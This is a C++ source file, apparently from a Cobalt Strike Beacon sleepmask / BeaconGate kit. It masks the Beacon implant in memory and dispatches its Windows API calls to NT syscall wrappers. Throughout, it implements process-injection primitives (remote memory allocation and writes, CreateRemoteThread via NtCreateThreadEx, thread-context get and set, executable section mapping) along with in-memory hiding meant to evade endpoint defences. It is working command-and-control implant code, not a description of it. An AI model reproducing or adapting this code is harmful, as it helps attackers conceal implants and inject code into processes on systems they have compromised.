#include "windows.h"
#include "..\beacon.h"
#include "..\sleepmask.h"
#include "..\sleepmask-vs.h"
#include "..\library\syscallapi.h"
#include "base\helpers.h"

/**
* The sys call interface layer between Beacon -> BeaconGate.
* Routes higher level API (e.g. VirtualAlloc) to its Nt equivalent (e.g. NtAllocateVirtualMemory).
*
* @param info A pointer to a SLEEPMASK_INFO structure.
* @param info A pointer to a FUNCTION_CALL structure.
*/
void SysCallDispatcher(PBEACON_INFO info, PFUNCTION_CALL functionCall) {

    // Mask Beacon.
    if (functionCall->bMask == TRUE) {
        MaskBeacon(info);
    }

    // API dispatcher.
    // Memory Management APIs.
    if (functionCall->function == WinApi::VIRTUALALLOC) NtAllocateVirtualMemoryWrapper(functionCall);
    else if (functionCall->function == WinApi::VIRTUALALLOCEX) NtAllocateVirtualMemoryWrapper(functionCall);
    else if (functionCall->function == WinApi::VIRTUALPROTECT) NtProtectVirtualMemoryWrapper(functionCall);
    else if (functionCall->function == WinApi::VIRTUALPROTECTEX) NtProtectVirtualMemoryWrapper(functionCall);
    else if (functionCall->function == WinApi::VIRTUALFREE) NtFreeVirtualMemoryWrapper(functionCall);
    else if (functionCall->function == WinApi::VIRTUALQUERY) NtQueryVirtualMemoryWrapper(functionCall);
    else if (functionCall->function == WinApi::CREATEFILEMAPPING) NtCreateSectionWrapper(functionCall);
    else if (functionCall->function == WinApi::MAPVIEWOFFILE) NtMapViewOfSectionWrapper(functionCall);
    else if (functionCall->function == WinApi::UNMAPVIEWOFFILE) NtUnmapViewOfSectionWrapper(functionCall);
    else if (functionCall->function == WinApi::READPROCESSMEMORY) NtReadProcessMemoryWrapper(functionCall);
    else if (functionCall->function == WinApi::WRITEPROCESSMEMORY) NtWriteProcessMemoryWrapper(functionCall);

    // Thread APIs.
    else if (functionCall->function == WinApi::CREATETHREAD) NtCreateThreadExWrapper(functionCall);
    else if (functionCall->function == WinApi::CREATEREMOTETHREAD) NtCreateThreadExWrapper(functionCall);
    else if (functionCall->function == WinApi::GETTHREADCONTEXT) NtGetContextThreadWrapper(functionCall);
    else if (functionCall->function == WinApi::SETTHREADCONTEXT) NtSetContextThreadWrapper(functionCall);
    else if (functionCall->function == WinApi::RESUMETHREAD) NtResumeThreadWrapper(functionCall);

    // Handle APIs.
    else if (functionCall->function == WinApi::OPENPROCESS) NtOpenProcessWrapper(functionCall);
    else if (functionCall->function == WinApi::OPENTHREAD) NtOpenThreadWrapper(functionCall);
    else if (functionCall->function == WinApi::CLOSEHANDLE) NtCloseWrapper(functionCall);
    else if (functionCall->function == WinApi::DUPLICATEHANDLE) NtDuplicateObjectWrapper(functionCall);

    DLOGF("SLEEPMASK: Syscall return value: 0x%p\n", functionCall->retValue);

    // Unmask Beacon.
    if (functionCall->bMask == TRUE) {
        UnMaskBeacon(info);
    }

    return;
}

/**
* Beacon API set - this is the interface layer between Beacon and low level API.
* These functions will transform the arguments for a higher level call (i.e. VirtualAlloc)
* to its sys call equivalent, NtAllocateVirtualMemory.
*
* Note: These transforms are the bear minimum needed to work with Beacon, they
* are not full replicas of the Windows API.
*/

/**
* VirtualAllocEx --> NtAllocateVirtualMemory
*
*   arg[0] [in] HANDLE hProcess        --> [0] [in] HANDLE ProcessHandle
*   arg[1] [in] LPVOID lpAddress       --> [1] [in] PVOID *BaseAddress
*                                      --> [2] [in] ULONG_PTR ZeroBits
*   arg[2] [in] SIZE_T dwSize          --> [3] [in] PSIZE_T RegionSize
*   arg[3] [in] DWORD flAllocationType --> [4] [in] ULONG AllocationType
*   arg[4] [in] DWORD flProtect        --> [5] [in] ULONG Protect
*
* Note: VirtualAlloc is the same except it does not pass a HANDLE
* so arg[x] indexes are shifted by -1.
*/
void NtAllocateVirtualMemoryWrapper(PFUNCTION_CALL functionCall) {
    DFR_LOCAL(KERNEL32, GetCurrentProcess);
    NTSTATUS ntStatus = 0;

    // Copy args for readability (not necessary).
    HANDLE hProcess = NULL;
    PVOID lpAddress = NULL;
    SIZE_T RegionSize = 0;
    ULONG AllocationType = 0;
    ULONG Protect = 0;
    int argIndex = 0;

    // Handle VirtualAlloc first.
    if (functionCall->numOfArgs == 4) {
        hProcess = GetCurrentProcess();
    }
    else {
        hProcess = (HANDLE)functionCall->args[0];
        argIndex++;
    }
    lpAddress = (PVOID)functionCall->args[argIndex];
    RegionSize = functionCall->args[argIndex+1];
    AllocationType = functionCall->args[argIndex+2];
    Protect = functionCall->args[argIndex+3];

    // Note: Ignoring ZeroBits arg / setting it to 0.
    ntStatus = _NtAllocateVirtualMemory(hProcess, &lpAddress, 0, &RegionSize, AllocationType, Protect);
    if (NT_SUCCESS(ntStatus)) {
        functionCall->retValue = (ULONG_PTR)lpAddress;
    }
    else {
        functionCall->retValue = NULL;
    }
}

/**
* VirtualProtectEx --> NtProtectVirtualMemory
*
*     arg[0] HANDLE hProcess       --> HANDLE ProcessHandle
*     arg[1] LPVOID lpAdress       --> PVOID *BaseAddress
*     arg[2] SIZE_T dwSize         --> PULONG NumberOfBytesToProtect
*     arg[3] DWORD flNewProtect    --> ULONG NewAccessProtection
*     arg[4] PDWORD lpflOldProtect --> PULONG OldAccessProtection
*
* Note: VirtualProtect is the same except it does not pass a HANDLE
* so arg[x] indexes are shifted by -1.
*/
void NtProtectVirtualMemoryWrapper(PFUNCTION_CALL functionCall) {
    DFR_LOCAL(KERNEL32, GetCurrentProcess);
    NTSTATUS ntStatus = 0;

    HANDLE hProcess = NULL;
    int argIndex = 0;

    // Work out if it is VirtualProtect or VirtualProtectEx.
    if (functionCall->numOfArgs == 4) {
        hProcess = GetCurrentProcess();
    }
    else {
        hProcess = (HANDLE)functionCall->args[0];
        argIndex++;
    }

    // Do translation to lower level API call.
    ntStatus = _NtProtectVirtualMemory(hProcess, (PVOID*)&(functionCall->args[argIndex]), &(functionCall->args[argIndex+1]), functionCall->args[argIndex+2], (PULONG)functionCall->args[argIndex+3]);
    if (NT_SUCCESS(ntStatus)) {
        functionCall->retValue = TRUE;
    }
    else {
        functionCall->retValue = FALSE;
    }
}

/**
* VirtualFree --> NtFreeVirtualMemory
*
*                            --> HANDLE ProcessHandle
*    arg[0] LPVOID lpAddress --> PVOID *BaseAddress
*    arg[1] SIZE_T dwSize    --> PSIZE_T RegionSize
*    arg[2] DWORD dwFreeType --> ULONG FreeType
*/
void NtFreeVirtualMemoryWrapper(PFUNCTION_CALL functionCall) {
    DFR_LOCAL(KERNEL32, GetCurrentProcess);
    NTSTATUS ntStatus = 0;
    HANDLE hProcess = GetCurrentProcess();

    // Do translation to lower level API call.
    ntStatus = _NtFreeVirtualMemory(hProcess, (PVOID*)&(functionCall->args[0]), &(functionCall->args[1]), functionCall->args[2]);
    if (NT_SUCCESS(ntStatus)) {
        functionCall->retValue = TRUE;
    }
    else {
        functionCall->retValue = FALSE;
    }
}

/**
* GetThreadContext --> NtGetContextThread
*
*    arg[0] [in] HANDLE hThread           -->   [0] [in] HANDLE ThreadHandle
*    arg[1] [in, out] LPCONTEXT lpContext -->   [1] [OUT] PCONTEXT pContext
*/
void NtGetContextThreadWrapper(PFUNCTION_CALL functionCall) {
    NTSTATUS ntStatus = 0;

    ntStatus = _NtGetContextThread((HANDLE)functionCall->args[0], (PCONTEXT)functionCall->args[1]);
    if (NT_SUCCESS(ntStatus)) {
        functionCall->retValue = TRUE;
    }
    else {
        functionCall->retValue = FALSE;
    }
}

/**
* SetThreadContext --> NtSetContextThread
*
*    arg[0] [in] HANDLE hThread     -->  [0] [in] HANDLE ThreadHandle
*    arg[1] [in] CONTEXT *lpContext -->  [1] [in] PCONTEXT Context
*/
void NtSetContextThreadWrapper(PFUNCTION_CALL functionCall) {
    NTSTATUS ntStatus = 0;

    ntStatus = _NtSetContextThread((HANDLE)functionCall->args[0], (PCONTEXT)functionCall->args[1]);
    if (NT_SUCCESS(ntStatus)) {
        functionCall->retValue = TRUE;
    }
    else {
        functionCall->retValue = FALSE;
    }
}

/**
* ResumeThread --> NtResumeThread
*
*    arg[0] [in] HANDLE hThread  --> [0] [in] HANDLE ThreadHandle
*                                --> [1] [out] PULONG PreviousSuspendCount
*/
void NtResumeThreadWrapper(PFUNCTION_CALL functionCall) {
    NTSTATUS ntStatus = 0;
    ULONG previousSuspendCount = 0;

    // Do translation to lower level API call.
    ntStatus = _NtResumeThread((HANDLE)functionCall->args[0], &previousSuspendCount);
    if (NT_SUCCESS(ntStatus)) {
        functionCall->retValue = previousSuspendCount;
    }
    else {
        functionCall->retValue = -1;
    }
}

/**
* CreateRemoteThread --> NtCreateThreadEx
*
*                                                             --> [0] [out] PHANDLE ThreadHandle
*                                                             --> [1] [in] ACCESS_MASK DesiredAccess
*                                                             --> [2] [in] POBJECT_ATTRIBUTES ObjectAttributes
*      arg[0] [in]  HANDLE                 hProcess           --> [3] [in] HANDLE ProcessHandle
*      arg[3] [in]  LPTHREAD_START_ROUTINE lpStartAddress     --> [4] [in] PVOID lpStartAddress
*      arg[4] [in]  LPVOID                 lpParameter        --> [5] [in] PVOID lpParameter
*      arg[5] [in]  DWORD                  dwCreationFlags    --> [6] [in] ULONG Flags
*                                                             --> [7] [in] SIZE_T StackZeroBits
*                                                             --> [8] [in] SIZE_T SizeOfStackCommit
*                                                             --> [9] [in] SIZE_T SizeOfStackReserve
*                                                             --> [10] PVOID lpBytesBuffer
*
*      arg[1] [in]  LPSECURITY_ATTRIBUTES  lpThreadAttributes  X  Ignored below; We currently always set this to NULL
*      arg[2] [in]  SIZE_T                 dwStackSize         X  Ignored below
*      arg[6] [out] LPDWORD                lpThreadId          X  Not supported currently
*
* Note: This does not return threadId as this is retrieved natively by higher level wrapper.
* However, you could add it if desired via using GetThreadId().
*/
void NtCreateThreadExWrapper(PFUNCTION_CALL functionCall) {
    DFR_LOCAL(KERNEL32, GetCurrentProcess);
    NTSTATUS ntStatus = 0;

    HANDLE hProcess = INVALID_HANDLE_VALUE;
    HANDLE hThread = INVALID_HANDLE_VALUE;
    PVOID startAddress = NULL;
    PVOID parameter = NULL;
    DWORD creationFlags = 0;
    int argIndex = 2;

    // Do translation to lower level API call.
    if (WinApi::CREATETHREAD == functionCall->function) {
        hProcess = GetCurrentProcess();
    }
    else {
        hProcess = (HANDLE)functionCall->args[0];
        argIndex++;
    }
    startAddress = (PVOID)functionCall->args[argIndex];
    parameter = (PVOID)functionCall->args[argIndex+1];
    creationFlags = (DWORD)functionCall->args[argIndex+2];

    /**
    * Note: Here we mimic Windows in always setting the createFlags param to 1 for the syscall
    * and then resume the thread after it has been successfully created.
    */
    ntStatus = _NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, startAddress, parameter, 1, 0, 0, 0, NULL);
    if (NT_SUCCESS(ntStatus)) {
        if (!(creationFlags & CREATE_SUSPENDED)) {
            // NB call directly our specific sys call api.
            _NtResumeThread(hThread, NULL);
        }
        functionCall->retValue = (ULONG_PTR)hThread;
    }
    else {
        functionCall->retValue = NULL;
    }
}

/**
* OpenProcess --> NtOpenProcess
*
*                                      --> [0] [out] PHANDLE ProcessHandle
*    arg[0] [in] DWORD dwDesiredAccess --> [1] [in] ACCESS_MASK DesiredAccess
*    arg[1] [in] BOOL bInheritHandle    X  [2] [in] POBJECT_ATTRIBUTES ObjectAttributes
*    arg[2] [in] DWORD dwProcessId      X  [3] [in] PCLIENT_ID ClientId
*/
void NtOpenProcessWrapper(PFUNCTION_CALL functionCall) {
    NTSTATUS ntStatus = 0;

    OBJECT_ATTRIBUTES objectAttributes;
    _memset(&objectAttributes, 0, sizeof(OBJECT_ATTRIBUTES));
    CLIENT_ID clientId;
    _memset(&clientId, 0, sizeof(CLIENT_ID));
    HANDLE hProcess = INVALID_HANDLE_VALUE;

    // Do translation to lower level API call.
    clientId.UniqueProcess = (HANDLE)functionCall->args[2];
    clientId.UniqueThread = 0;
    objectAttributes.Length = sizeof(OBJECT_ATTRIBUTES);
    objectAttributes.Attributes = (BOOL)(functionCall->args[1]) ? OBJ_INHERIT : 0;

    ntStatus = _NtOpenProcess(&hProcess, functionCall->args[0], &objectAttributes, &clientId);
    if (NT_SUCCESS(ntStatus)) {
        functionCall->retValue = (ULONG_PTR)hProcess;
    }
    else {
        functionCall->retValue = NULL;
    }
}

/**
* OpenThread --> NtOpenThread
*
*                                     --> [0] [out] PHANDLE ThreadHandle
*   arg[0] [in] DWORD dwDesiredAccess --> [1] [in] ACCESS_MASK DesiredAccess
*   arg[1] [in] BOOL bInheritHandle   --> [2] [in] POBJECT_ATTRIBUTES ObjectAttributes
*   arg[2] [in] DWORD dwThreadId      --> [3] [in] PCLIENT_ID ClientId
*/
void NtOpenThreadWrapper(PFUNCTION_CALL functionCall) {
    NTSTATUS ntStatus = 0;

    OBJECT_ATTRIBUTES objectAttributes;
    _memset(&objectAttributes, 0, sizeof(OBJECT_ATTRIBUTES));
    CLIENT_ID clientId;
    _memset(&clientId, 0, sizeof(CLIENT_ID));
    HANDLE hThread = INVALID_HANDLE_VALUE;

    // Do translation to lower level API call.
    clientId.UniqueProcess = NULL;
    clientId.UniqueThread = (HANDLE)functionCall->args[2];
    objectAttributes.Length = sizeof(OBJECT_ATTRIBUTES);
    objectAttributes.Attributes = (BOOL)functionCall->args[1] ? OBJ_INHERIT : 0;

    ntStatus = _NtOpenThread(&hThread, functionCall->args[0], &objectAttributes, &clientId);
    if (NT_SUCCESS(ntStatus)) {
        functionCall->retValue = (ULONG_PTR)hThread;
    }
    else {
        functionCall->retValue = NULL;
    }
}

/**
* CloseHandle --> NtClose
*
*    arg[0] HANDLE hObject --> [0] [in] HANDLE Handle
*/
void NtCloseWrapper(PFUNCTION_CALL functionCall) {
    NTSTATUS ntStatus = 0;

    ntStatus = _NtClose((HANDLE)functionCall->args[0]);
    if (NT_SUCCESS(ntStatus)) {
        functionCall->retValue = TRUE;
    }
    else {
        functionCall->retValue = FALSE;
    }
}

/**
* CreateFileMappingA --> NtCreateSection
*
*                                                                              --> [0] [out] PHANDLE SectionHandle
*                                                                              --> [1] [in] ACCESS_MASK DesiredAccess
*                                                                              --> [2] [in] POBJECT_ATTRIBUTES ObjectAttributes
*    arg[3] [in] DWORD dwMaximumSizeHigh / arg[4] [in] DWORD dwMaximumSizeLow  --> [3] [in] PLARGE_INTEGER MaximumSize
*    arg[2] [in] DWORD flProtect                                               --> [4] [in] ULONG SectionPageProtection
*                                                                              --> [5] [in] ULONG AllocationAttributes
*                                                                              --> [6] [in] HANDLE FileHandle
*
*    arg[0] [in] HANDLE hFile                                                  X Ignored currently
*    arg[1] [in] LPSECURITY_ATTRIBUTES lpFileMappingAttributes                 X Ignored currently
*    arg[5] [in] LPCSTR lpName                                                 X Ignored currently
*/
void NtCreateSectionWrapper(PFUNCTION_CALL functionCall) {
    /**
    * This is a very basic translation of args from CreateFileMappingA to NtCreateSection.
    * *It is* suitable for Beacon's purposes but does not handle passing lpName or hFile
    * For example, hFile/arg0, LPSECURITY_ATTRIBUTES/arg1 and lpName/5 are ignored.
    * https://doxygen.reactos.org/de/d40/filemap_8c.html#ab537c934fd29d080f1a28c9d72e0ea4a.
    */

    NTSTATUS ntStatus = 0;
    HANDLE hSection = NULL;

    // Set the attributes.
    ULONG flAttributes = 0;
    DWORD flProtect = functionCall->args[2];
    flAttributes = flProtect & (SEC_FILE | SEC_IMAGE | SEC_RESERVE | SEC_NOCACHE | SEC_COMMIT | SEC_LARGE_PAGES);
    flProtect ^= flAttributes;
    if (!flAttributes) flAttributes = SEC_COMMIT;

    // Set the section size.
    LARGE_INTEGER lSectionSize;
    lSectionSize.HighPart = functionCall->args[3];
    lSectionSize.LowPart = functionCall->args[4];

    // rock and or roll.
    ntStatus = _NtCreateSection(&hSection, STANDARD_RIGHTS_REQUIRED | SECTION_QUERY | SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE, NULL, &lSectionSize, flProtect, flAttributes, NULL);
    if (NT_SUCCESS(ntStatus)) {
        functionCall->retValue = (ULONG_PTR)hSection;
    }
    else {
        functionCall->retValue = NULL;
    }
}

/**
* MapViewOfFile --> NtMapViewOfSection
*
*     arg[0] [in] HANDLE fileMappingObject  --> [0] [in]                HANDLE          SectionHandle
*                                               [1] [in]                HANDLE          ProcessHandle
*                                               [2] [in, out]           PVOID           *BaseAddress
*                                               [3] [in]                ULONG_PTR       ZeroBits
*                                               [4] [in]                SIZE_T          CommitSize
*                                               [5] [in, out]           PLARGE_INTEGER  SectionOffset
*                                               [6] [in, out]           PSIZE_T         ViewSize
*                                               [7] [in]                SECTION_INHERIT InheritDisposition
*                                               [8] [in]                ULONG           AllocationType
*     arg[1] [in] DWORD dwDesiredAccess     --> [9] [in]                ULONG           Win32Protect
*
*     arg[2] [in] DWORD dwFileOffsetHigh       X  Ignored
*     arg[3] [in] DWORD dwFileOffsetLow        X  Ignored
*     arg[4] [in] SIZE_T dwNumberOfBytesToMap  X  Ignored
*/
void NtMapViewOfSectionWrapper(PFUNCTION_CALL functionCall) {
    DFR_LOCAL(KERNEL32, GetCurrentProcess);
    NTSTATUS ntStatus = 0;

    HANDLE hProcess = GetCurrentProcess();
    PVOID BaseAddress = NULL;
    LARGE_INTEGER sectionOffset;
    SIZE_T viewSize = 0;
    ULONG protection = 0;

    // Do translation to lower level API call.
    sectionOffset.LowPart = 0;
    sectionOffset.HighPart = 0;
    protection = functionCall->args[1] & FILE_MAP_EXECUTE ? PAGE_EXECUTE_READWRITE : PAGE_READWRITE;

    ntStatus = _NtMapViewOfSection((HANDLE)functionCall->args[0], hProcess, &BaseAddress, 0, 0, &sectionOffset, &viewSize, ViewShare, 0, protection);
    if (NT_SUCCESS(ntStatus)) {
        functionCall->retValue = (ULONG_PTR)BaseAddress;
    }
    else {
        functionCall->retValue = NULL;
    }
}

/**
* UnmapViewOfFile --> NtUnmapViewOfSection
*
*                                       --> [in] HANDLE ProcessHandle
*    arg[0] [in] LPCVOID lpBase Address --> [in] PVOID BaseAddress
*/
void NtUnmapViewOfSectionWrapper(PFUNCTION_CALL functionCall) {
    DFR_LOCAL(KERNEL32, GetCurrentProcess);
    NTSTATUS ntStatus = 0;
    HANDLE hProcess = GetCurrentProcess();

    ntStatus = _NtUnmapViewOfSection(hProcess, (PVOID)functionCall->args[0]);
    if (NT_SUCCESS(ntStatus)) {
        functionCall->retValue = TRUE;
    }
    else {
        functionCall->retValue = FALSE;
    }
}

/**
* VirtualQuery --> NtQueryVirtualMemory
*
*                                                     --> [0] [in] HANDLE ProcessHandle
*    arg[0] [in] LPCVOID lpAddress                    --> [1] [in] PVOID BaseAddress
*                                                     --> [2] [in] MEMORY_INFORMATION_CLASS MemoryInformationClass
*    arg[1] [out] PMEMORY_BASIC_INFORMATION lpBuffer  --> [3] [out] PVOID MemoryInformation
*    arg[2] [in] SIZE_T dwLength                      --> [4] [in] MemoryInformationLength
*                                                     --> [5] [out] PSIZE_T ReturnLength
*/
void NtQueryVirtualMemoryWrapper(PFUNCTION_CALL functionCall) {
    DFR_LOCAL(KERNEL32, GetCurrentProcess);
    NTSTATUS ntStatus = 0;
    HANDLE hProcess = GetCurrentProcess();
    SIZE_T ReturnLength = 0;

    ntStatus = _NtQueryVirtualMemory(hProcess, (PVOID)functionCall->args[0], MemoryBasicInformation, (PVOID)functionCall->args[1], functionCall->args[2], &ReturnLength);
    if (NT_SUCCESS(ntStatus)) {
        functionCall->retValue = ReturnLength;
    }
    else {
        functionCall->retValue = 0;
    }
}

/**
* DuplicateHandle --> NtDuplicateObject
*
*      arg[0] [in]  HANDLE   hSourceProcessHandle --> [0] [in] HANDLE SourceProcessHandle
*      arg[1] [in]  HANDLE   hSourceHandle        --> [1] [in] HANDLE SourceHandle
*      arg[2] [in]  HANDLE   hTargetProcessHandle --> [2] [in] HANDLE TargetProcessHandle
*      arg[3] [out] LPHANDLE lpTargetHandle       --> [3] [out] PHANDLE TargetHandle
*      arg[4] [in]  DWORD    dwDesiredAccess      --> [4] [in] ACCESS_MASK DesiredAccess
*      arg[5] [in]  BOOL     bInheritHandle       --> [5] [in] ULONG Attributes (w/ some modifications)
*      arg[6] [in]  DWORD    dwOptions            --> [6] [in] ULONG Options
*/
void NtDuplicateObjectWrapper(PFUNCTION_CALL functionCall) {
    NTSTATUS ntStatus = 0;
    ULONG handleAttributes = functionCall->args[5] ? OBJ_INHERIT : 0;

    ntStatus = _NtDuplicateObject((HANDLE)functionCall->args[0], (HANDLE)functionCall->args[1], (HANDLE)functionCall->args[2], (PHANDLE)functionCall->args[3], functionCall->args[4], handleAttributes, functionCall->args[6]);
    if (NT_SUCCESS(ntStatus)) {
        functionCall->retValue = TRUE;
    }
    else {
        functionCall->retValue = FALSE;
    }
}

/**
* ReadProcessMemory--> NtReadVirtualMemory
*
*      arg[0] [in]  HANDLE  hProcess             --> [0] [in] HANDLE ProcessHandle
*      arg[1] [in]  LPCVOID lpBaseAddress        --> [1] [in] PVOID BaseAddress
*      arg[2] [out] LPVOID  lpBuffer             --> [2] [out] PVOID Buffer
*      arg[3] [in]  SIZE_T  nSize                --> [3] [in] ULONG BufferLength
*      arg[4] [out] SIZE_T  *lpNumberOfBytesRead --> [4] [out] PULONG ReturnLength
*/
void NtReadProcessMemoryWrapper(PFUNCTION_CALL functionCall) {
    NTSTATUS ntStatus = 0;

    ntStatus = _NtReadVirtualMemory((HANDLE)functionCall->args[0], (PVOID)functionCall->args[1], (PVOID)functionCall->args[2], functionCall->args[3], (PSIZE_T)functionCall->args[4]);
    if (NT_SUCCESS(ntStatus)) {
        functionCall->retValue = TRUE;
    }
    else {
        functionCall->retValue = FALSE;
    }
}

/**
* WriteProcessMemory --> NtWriteProcessMemory
*
*      arg[0] [in]  HANDLE  hProcess                 --> [0] [in] HANDLE ProcessHandle
*      arg[1] [in]  LPVOID  lpBaseAddress            --> [1] [in] PVOID BaseAddress
*      arg[2] [in]  LPCVOID lpBuffer                 --> [2] [in] PVOID Buffer
*      arg[3] [in]  SIZE_T  nSize                    --> [3] [in] ULONG BufferLength
*      arg[4] [out] SIZE_T  *lpNumberOfBytesWritten  --> [4] [out] PULONG ReturnLength
*/
void NtWriteProcessMemoryWrapper(PFUNCTION_CALL functionCall) {
    NTSTATUS ntStatus = 0;

    ntStatus = _NtWriteVirtualMemory((HANDLE)functionCall->args[0], (LPVOID)functionCall->args[1], (PVOID)functionCall->args[2], functionCall->args[3], (SIZE_T*)functionCall->args[4]);
    if (NT_SUCCESS(ntStatus)) {
        functionCall->retValue = TRUE;
    }
    else {
        functionCall->retValue = FALSE;
    }
}

